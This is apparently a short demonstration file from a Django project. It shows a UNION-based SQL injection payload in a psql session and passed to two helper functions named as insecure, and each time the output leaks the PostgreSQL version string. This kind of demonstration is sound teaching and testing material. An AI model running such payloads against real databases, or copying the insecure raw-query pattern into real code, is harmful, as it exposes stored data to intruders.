# Test attack calls

## Postgres shell call
```sql
postgres=# SELECT id, name, address, opening_hours FROM parcel_store_parcelstore WHERE parcel_store_parcelstore.address LIKE '%Wroclaw%' UNION SELECT NULL, version(), NULL, NULL; --%'
 id |                                                            name                                                             |              address              | opening_hours 
----+-----------------------------------------------------------------------------------------------------------------------------+-----------------------------------+---------------
  2 | Wroclaw store                                                                                                               | Street 1,  50-549 Wroclaw, Polska | 8:00-18:00
    | PostgreSQL 15.1 (Debian 15.1-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit |                                   | 
(2 rows)

postgres=# 
```

## Test manager raw
### Django shell call
```py
>>> from pprint import pprint
>>> from parcel_store.utils import get_parcel_stores_filtered_by_address_with_manager_raw_insecure
>>> parcel_stores = get_parcel_stores_filtered_by_address_with_manager_raw_insecure("Wroclaw%%' UNION SELECT NULL, version(), NULL, NULL; --")
>>> pprint(parcel_stores)
[(2, 'Wroclaw store', 'Street 1,  50-549 Wroclaw, Polska', '8:00-18:00'),
 (None,
  'PostgreSQL 15.1 (Debian 15.1-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled '
  'by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit',
  None,
  None)]
>>> 
```

## Test direct sql
### Django shell call
```py
>>> from pprint import pprint
>>> from parcel_store.utils import get_parcel_stores_filtered_by_address_with_direct_sql_insecure
>>> parcel_stores = get_parcel_stores_filtered_by_address_with_direct_sql_insecure("Wroclaw%%' UNION SELECT NULL, version(), NULL, NULL; --")
>>> pprint(parcel_stores)
[(2, 'Wroclaw store', 'Street 1,  50-549 Wroclaw, Polska', '8:00-18:00'),
 (None,
  'PostgreSQL 15.1 (Debian 15.1-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled '
  'by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit',
  None,
  None)]
>>> 
```
